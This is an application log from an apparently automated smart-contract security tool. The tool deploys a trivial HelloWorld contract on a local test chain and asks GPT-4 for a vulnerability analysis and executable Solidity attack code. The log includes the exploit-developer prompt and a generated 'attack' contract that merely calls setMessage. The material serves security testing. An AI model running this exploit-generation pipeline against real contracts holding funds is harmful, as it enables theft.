2025-07-05 23:38:18,827 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:18,829 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:18,832 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:18,834 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 23:38:29,959 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:29,974 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:29,978 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:29,982 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 23:38:29,999 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 23:38:30,019 - api.contract - INFO - Analyzing code snippet
2025-07-05 23:38:30,035 - api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 23:38:30,042 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpxqxaekyx.sol
2025-07-05 23:38:30,054 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 23:38:30,056 - services.contract_service - INFO - Compiling contract...
2025-07-05 23:38:30,256 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-05 23:38:31,146 - solcx - INFO - Using solc version 0.8.0
2025-07-05 23:38:31,148 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-05 23:38:31,159 - solcx - INFO - Using solc version 0.8.0
2025-07-05 23:38:32,856 - services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-05 23:38:32,858 - services.contract_service - INFO - Deploying 1 contracts...
2025-07-05 23:38:33,518 - services.contract_service - INFO - Contract HelloWorld deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-05 23:38:33,521 - services.contract_service - INFO - Setting up contract HelloWorld...
2025-07-05 23:38:36,225 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 23:38:37,594 - services.contract_service - INFO - Contract HelloWorld setup completed
2025-07-05 23:38:37,596 - services.contract_service - INFO - Funding contract HelloWorld for attack testing...
2025-07-05 23:38:37,798 - services.contract_service - INFO - Contract HelloWorld funded
2025-07-05 23:38:37,800 - services.contract_service - INFO - Building contract observation...
2025-07-05 23:38:38,093 - services.contract_service - INFO - Contract observation built successfully
2025-07-05 23:38:38,096 - services.contract_service - INFO - Generating attack strategy...
2025-07-05 23:38:38,097 - services.contract_service - INFO - Running Slither analysis...
2025-07-05 23:38:38,114 - services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 23:38:38,164 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 23:38:38,168 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 23:38:38,170 - modules.attack_generator - INFO - Contract name: HelloWorld
2025-07-05 23:38:38,171 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 23:38:38,173 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 23:38:38,177 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 23:38:38,179 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 23:38:38,181 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 23:38:43,913 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 23:38:43,934 - modules.attack_generator - INFO - Received response from OpenAI API in 5.75 seconds
2025-07-05 23:38:43,942 - modules.attack_generator - INFO - Contract analysis completed in 5.75 seconds
2025-07-05 23:38:43,946 - modules.attack_generator - INFO - Vulnerability assessment: - **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ...
2025-07-05 23:38:43,950 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 23:38:43,952 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 23:38:43,956 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 23:38:43,958 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 23:38:46,432 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 23:38:46,458 - modules.attack_generator - INFO - Received response from OpenAI API in 2.50 seconds
2025-07-05 23:38:46,465 - modules.attack_generator - INFO - Attack code generation completed in 2.50 seconds
2025-07-05 23:38:46,469 - modules.attack_generator - INFO - Generated attack code of type solidity with length 371
2025-07-05 23:38:46,472 - modules.attack_generator - INFO - Total attack strategy generation completed in 8.26 seconds
2025-07-05 23:38:46,476 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 23:38:46,483 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpxqxaekyx.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloWorld",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "message",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "name": "setMessage",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "message",\n          "signature": "message()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setMessage",\n          "signature": "setMessage(string)",\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99986650040000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "message": "Bonjour, ceci est un message"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloWorld {\\n    string public message;\\n\\n    constructor() {\\n        message = \\"Hello, World!\\";\\n    }\\n\\n    function setMessage(string memory newMessage) public {\\n        message = newMessage;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `HelloWorld` is a simple contract that stores a single string message. It has a public state variable `message` initialized to `"Hello, World!"` in the constructor. The contract allows anyone to update the message via the `setMessage` function, which is a public function with no access control. The contract holds no ETH and does not implement any business logic related to funds or permissions.\n\n2. Vulnerability Assessment:  \n- **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  \n- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  \n- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.\n\n3. Exploitation Requirements:  \n- No special setup is required to call `setMessage`. Any user can call this function at any time to change the message.  \n- Since the contract holds no ETH or other assets, no financial loss or exploitation is possible.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- Contract does not hold funds or implement sensitive business logic.  \n- No critical vulnerabilities detected.  \n- The only notable point is the lack of access control on `setMessage`, allowing anyone to overwrite the message. This may or may not be intended behavior.', 'contract_analysis': 'The contract `HelloWorld` is a simple contract that stores a single string message. It has a public state variable `message` initialized to `"Hello, World!"` in the constructor. The contract allows anyone to update the message via the `setMessage` function, which is a public function with no access control. The contract holds no ETH and does not implement any business logic related to funds or permissions.\n\n2.', 'vulnerability_assessment': '- **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  \n- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  \n- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.\n\n3.', 'exploitation_requirements': '- No special setup is required to call `setMessage`. Any user can call this function at any time to change the message.  \n- Since the contract holds no ETH or other assets, no financial loss or exploitation is possible.', 'analysis_duration': 5.753996849060059}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `HelloWorld` is a simple contract that stores a single string message. It has a public state variable `message` initialized to `"Hello, World!"` in the constructor. The contract allows anyone to update the message via the `setMessage` function, which is a public function with no access control. The contract holds no ETH and does not implement any business logic related to funds or permissions.\n\n2.\n\nVulnerability Assessment: - **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  \n- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  \n- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.\n\n3.\n\nExploitation Requirements: - No special setup is required to call `setMessage`. Any user can call this function at any time to change the message.  \n- Since the contract holds no ETH or other assets, no financial loss or exploitation is possible.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld public target;\n\n    constructor(address targetAddress) {\n        target = IHelloWorld(targetAddress);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld public target;\n\n    constructor(address targetAddress) {\n        target = IHelloWorld(targetAddress);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 2.502856492996216}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpxqxaekyx.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloWorld",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "message",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "name": "setMessage",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "message",\n          "signature": "message()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setMessage",\n          "signature": "setMessage(string)",\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99986650040000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "message": "Bonjour, ceci est un message"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloWorld {\\n    string public message;\\n\\n    constructor() {\\n        message = \\"Hello, World!\\";\\n    }\\n\\n    function setMessage(string memory newMessage) public {\\n        message = newMessage;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `HelloWorld` is a simple contract that stores a single string message. It has a public state variable `message` initialized to `"Hello, World!"` in the constructor. The contract allows anyone to update the message via the `setMessage` function, which is a public function with no access control. The contract holds no ETH and does not implement any business logic related to funds or permissions.\n\n2. Vulnerability Assessment:  \n- **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  \n- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  \n- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.\n\n3. Exploitation Requirements:  \n- No special setup is required to call `setMessage`. Any user can call this function at any time to change the message.  \n- Since the contract holds no ETH or other assets, no financial loss or exploitation is possible.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- Contract does not hold funds or implement sensitive business logic.  \n- No critical vulnerabilities detected.  \n- The only notable point is the lack of access control on `setMessage`, allowing anyone to overwrite the message. This may or may not be intended behavior.', 'reasoning': 'The contract `HelloWorld` is a simple contract that stores a single string message. It has a public state variable `message` initialized to `"Hello, World!"` in the constructor. The contract allows anyone to update the message via the `setMessage` function, which is a public function with no access control. The contract holds no ETH and does not implement any business logic related to funds or permissions.\n\n2.', 'summary': '- **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  \n- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  \n- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld public target;\n\n    constructor(address targetAddress) {\n        target = IHelloWorld(targetAddress);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}', 'code_type': 'solidity', 'duration': 8.256853342056274}
2025-07-05 23:38:46,493 - services.contract_service - INFO - Has exploit code: True
2025-07-05 23:38:46,497 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 23:38:46,500 - services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 23:38:46,502 - services.contract_service - INFO - Attack strategy summary: - **No critical vulnerabilities related to funds or permissions**: Since the contract does not hold ETH or user funds, there is no risk of theft or reentrancy.  
- **Lack of access control on `setMessage`**: Anyone can call `setMessage` and change the stored message arbitrarily. This is not necessarily a security vulnerability if the contract is intended to be fully public and mutable, but it could be a logic flaw if the message is expected to be controlled by a specific party.  
- **No other logic bugs or unsafe calls**: The contract is straightforward and uses Solidity 0.8.0, which has built-in overflow checks.

3.
2025-07-05 23:38:46,505 - services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 23:38:46,507 - services.contract_service - INFO - Temporary file /tmp/tmpxqxaekyx.sol removed
2025-07-05 23:38:46,757 - api.contract - INFO - Report saved with filename: HelloWorld_2025-07-05_23-38, status: KO
2025-07-05 23:38:46,760 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 23:38:46,764 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:46,766 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:46,767 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:46,769 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 23:38:48,597 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:48,620 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:48,630 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:48,639 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 23:38:48,705 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:48,707 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:48,709 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:48,711 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:10,553 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-06 09:23:11,440 - app - INFO - Application started
2025-07-06 09:23:11,452 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,455 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,458 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,460 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
